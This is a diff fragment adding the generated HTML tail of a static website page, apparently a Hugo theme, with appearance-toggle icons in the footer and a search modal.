+              <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span>
+            </div>
+            <div
+              class="hidden h-12 w-12 items-center justify-center dark:flex"
+              title="Switch to light appearance"
+            >
+              <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span>
+            </div>
+          </button>
+        </div>
+      
+    </div>
+  </div>
+  
+  
+</footer>
+<div
+  id="search-wrapper"
+  class="invisible fixed inset-0 z-50 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm sm:p-6 md:p-[10vh] lg:p-[12vh] dark:bg-neutral-900/50"
+  data-url="//localhost:1313/"
+>
+  <div
+    id="search-modal"
+    class="top-20 mx-auto flex min-h-0 w-full max-w-3xl flex-col rounded-md border border-neutral-200 bg-neutral shadow-lg dark:border-neutral-700 dark:bg-neutral-800"
+  >
+    <header class="relative z-10 flex flex-none items-center justify-between px-2">
+      <form class="flex min-w-0 flex-auto items-center">
+        <div class="flex h-8 w-8 items-center justify-center text-neutral-400">
+          <span class="icon relative inline-block px-1 align-text-bottom"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="mx-1 flex h-12 flex-auto appearance-none bg-transparent focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0"
+        />
+      </form>
+      <button
+        id="close-search-button"
+        class="flex h-8 w-8 items-center justify-center text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)"
+      >
+        <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+      </button>
+    </header>
+    <section class="flex-auto overflow-auto px-2">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+    </div>
+  </body>
+</html>
